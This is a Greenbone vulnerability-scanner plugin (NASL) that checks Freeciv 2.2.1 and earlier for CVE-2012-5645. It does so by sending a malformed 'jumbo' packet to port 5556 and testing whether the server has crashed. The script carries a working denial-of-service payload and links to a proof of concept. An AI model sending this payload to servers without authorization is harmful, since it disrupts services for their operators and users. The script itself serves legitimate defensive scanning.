# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803172");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-5645");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-01-03 17:46:00 +0000 (Fri, 03 Jan 2020)");
  script_tag(name:"creation_date", value:"2013-02-21 15:50:07 +0530 (Thu, 21 Feb 2013)");
  script_name("Freeciv Multiple Remote Denial Of Service Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(5556);

  script_xref(name:"URL", value:"http://aluigi.org/poc/freecivet.zip");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/41352");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/freecivet-adv.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"Freeciv Version 2.2.1 and prior");

  script_tag(name:"insight", value:"- Malloc exception in 'jumbo' packet within the common/packet.c.
  Endless loop in packets PACKET_PLAYER_INFO, PACKET_GAME_INFO,
  PACKET_EDIT_PLAYER_CREATE, PACKET_EDIT_PLAYER_REMOVE, PACKET_EDIT_CITY
  and PACKET_EDIT_PLAYER use some particular functions that can be tricked
  into an endless loop that freezes the server with CPU at 100%.");

  script_tag(name:"solution", value:"Update to version 2.2.2 or later.");

  script_tag(name:"summary", value:"Freeciv is prone to multiple denial of service vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.freeciv.org");
  exit(0);
}

frcviPort = 5556;
if(!get_port_state(frcviPort)){
  exit(0);
}

soc = open_sock_tcp(frcviPort);
if(!soc){
  exit(0);
}

req = raw_string(0xff, 0xff, 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:req);
close(soc);

sleep(5);

soc = open_sock_tcp(frcviPort);
if(!soc)
{
  security_message(port:frcviPort);
  exit(0);
}

close(soc);
